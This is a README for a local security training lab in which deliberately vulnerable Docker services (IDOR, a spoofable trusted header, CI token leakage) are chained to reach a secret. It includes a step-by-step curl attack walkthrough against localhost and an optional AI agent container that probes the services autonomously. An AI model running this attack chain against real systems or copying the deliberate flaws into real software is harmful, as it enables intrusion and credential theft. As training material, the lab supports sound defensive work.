# Training Chain Lab

This lab is a local, isolated training environment that demonstrates how several low/medium issues can combine into a critical compromise.

## Safety

- Use only on a local machine or isolated test network.
- Do not expose these services to the internet.
- Do not use production credentials or real data.

## Components

- `web-portal` (`:8080`): info leak + IDOR + weak proxy behavior.
- `internal-admin` (`:8081`): trusts spoofable `X-Forwarded-User`.
- `ci-runner` (`:8082`): over-privileged automation + token leakage in logs.
- `secrets-store` (`:8083`): protected secret endpoint.

Runtime chain in `docker-compose.yml`:

- `web-portal` calls `internal-admin` via `INTERNAL_ADMIN_URL`.
- `internal-admin` calls `ci-runner` via `CI_RUNNER_URL`.
- `ci-runner` reaches `secrets-store` via `SECRETS_STORE_URL`.
- `ci-runner` and `secrets-store` share the same training token value (`ci-logs-token`).

## Start

```bash
cd lab
docker compose up --build
```

## Run with a neighboring Codex container

The `codex-agent` service is optional and starts only with the `codex` profile.

```bash
cd lab
mkdir -p codex-agent/workdir codex-agent/artifacts
docker compose --profile codex up --build -d
```

Open a shell inside the neighboring container:

```bash
docker compose exec codex-agent bash
```

Run the bounded RALPH loop:

```bash
docker compose exec codex-agent python /workspace/ralph_loop.py
```

Inside `codex-agent`, target services are reachable by internal DNS names:

- `http://web-portal:8080`
- `http://internal-admin:8081`
- `http://ci-runner:8082`
- `http://secrets-store:8083`

RALPH writes run memory and logs to `./codex-agent/artifacts`:

- `memory/state.json`
- `memory/hypotheses.jsonl`
- `memory/findings.jsonl`
- `memory/failures.jsonl`
- `memory/lessons.md`
- `logs/requests.jsonl`
- `logs/responses.jsonl`
- `logs/iterations.jsonl`

Hardening choices in this example:

- No Docker socket mount.
- `no-new-privileges`, `cap_drop: ALL`, and `tmpfs: /tmp`.
- Basic CPU/memory limits (`cpus: 1.0`, `mem_limit: 512m`).
- `read_only: true` is currently commented out in `docker-compose.yml`.
- `./codex-agent/workdir` and `./codex-agent/artifacts` are currently mounted in default (read-write) mode.
- To tighten the container, uncomment `read_only: true` and mount workspace as `:ro`.

## Demo chain (safe training walkthrough)

1. Recon and internal hints:

```bash
curl -s http://localhost:8080/api/error-debug | jq
```

2. IDOR to read other user profiles:

```bash
curl -s "http://localhost:8080/api/profile?id=1" | jq
curl -s "http://localhost:8080/api/profile?id=3" | jq
```

3. Trigger internal admin action through weak trusted header path:

```bash
curl -s "http://localhost:8080/api/admin/proxy-run?job=export" | jq
```

4. Read CI logs that leak the token:

```bash
curl -s http://localhost:8082/logs | jq
```

5. Use leaked token against secret store:

```bash
curl -s http://localhost:8083/secret \
  -H "Authorization: Bearer ci-logs-token" | jq
```

## Expected outcome

- Request without token returns `401` (`invalid token`).
- Final request with leaked token returns `FLAG{training-chain-compromise}`.

## Suggested hardening exercises

- Remove verbose debug responses.
- Enforce proper authz checks on object access (`/api/profile`).
- Never trust `X-Forwarded-*` directly in app logic.
- Scope CI service account permissions minimally.
- Prevent secrets from ever entering logs.
